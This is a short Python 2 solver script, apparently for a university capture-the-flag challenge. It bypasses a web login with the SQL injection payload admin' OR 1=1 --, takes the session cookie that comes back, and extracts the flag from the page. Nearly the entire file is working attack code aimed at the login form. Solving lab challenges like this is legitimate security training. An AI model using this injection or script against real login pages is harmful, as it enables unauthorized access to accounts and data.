#import from py
import re

#outside imports
import requests
from pwn import *

host = 'offsec-chalbroker.osiris.cyber.nyu.edu'
port = 1240
netid='adp369'

#used for pulling the flag from output
flag_regex = r"flag\{[^}]+\}"
global_timeout = 5 #seconds
requests_proxies = {}
requests_proxies['http'] = 'http://192.168.149.1:8080'

#universal flag finder, given a string
def find_flag(input):
    m = re.findall(flag_regex, input)
    if(m != []):
        return m[0]
    else:
        return None


sqli = "email=admin' OR 1=1 -- &password=foo"


def solve():
    #sqli
    url = 'http://%s:%d/login.php' % (host, port)
    cookies = {'CHALBROKER_USER_ID':netid}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    r = requests.post(url, cookies=cookies, allow_redirects=False, proxies=requests_proxies, headers=headers, data=sqli)
    if('Set-Cookie' in r.headers):
        cookiename, cookieval = r.headers['Set-Cookie'].split(';')[0].split('=')
        cookies[cookiename] = cookieval
    else:
        print 'Did not get a cookie ; login didnt seem to work'
        return None

    #get the flag
    url = 'http://%s:%d/' % (host, port)
    r = requests.get(url, cookies=cookies, proxies=requests_proxies)
    return find_flag(r.text)

#scaffolding
def main():
    flag = solve()
    if(flag):
        print "Challenge Solved: %s" % flag
    else:
        print "Challenge Not Solved"

if __name__ == '__main__':
    main()